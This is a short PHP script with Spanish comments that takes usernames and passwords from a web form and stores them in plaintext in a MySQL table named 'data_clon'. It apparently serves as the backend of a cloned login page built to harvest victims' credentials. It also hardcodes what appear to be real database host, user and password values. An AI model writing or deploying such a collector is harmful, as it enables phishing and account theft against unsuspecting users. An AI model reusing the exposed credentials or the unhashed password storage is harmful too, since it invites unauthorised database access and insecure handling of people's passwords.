<?php
$servername = "fdb1027.cloudhostingstudio.com";
$username = "4630685_dataclon";
$password = "Z-B*oKp78-Rhx-v!";
$dbname = "4630685_dataclon";

// Connect to MySQL
$mysql = mysqli_connect($servername, $username, $password, $dbname);

// Verificar conexión
if ($mysql->connect_error) {
    die("Connection failed: " . $mysql->connect_error);
}

// Verificar si se envió el formulario
if(isset($_POST['submit'])) {
    // Saneamiento básico de los datos de entrada
    $user = mysqli_real_escape_string($mysql, $_POST["user"]);
    $pass = mysqli_real_escape_string($mysql, $_POST["pass"]);
    
    // Primero, verifica si tanto el usuario como la contraseña existen JUNTOS en la misma fila
    $check = $mysql->query("SELECT 1 FROM data_clon WHERE user = '$user' AND pass = '$pass' LIMIT 1");
    
    // Verifica si encontró alguna coincidencia
    if($check && $check->num_rows > 0){
        echo "El usuario ya existe con esa contraseña.\n";
    } else {
        // Insertar datos en la tabla de la BD
        $sql = "INSERT INTO data_clon (user, pass) VALUES ('$user','$pass')";
        
        // Comprueba si se insertaron los datos en la tabla
        if ($mysql->query($sql) === TRUE) {
            echo "La data se ha subido con éxito.";
        } else {
            echo "Fallo al subir la data: " . $mysql->error;
        }
    }
    
    // Cerrar conexión
    $mysql->close();
}
?>
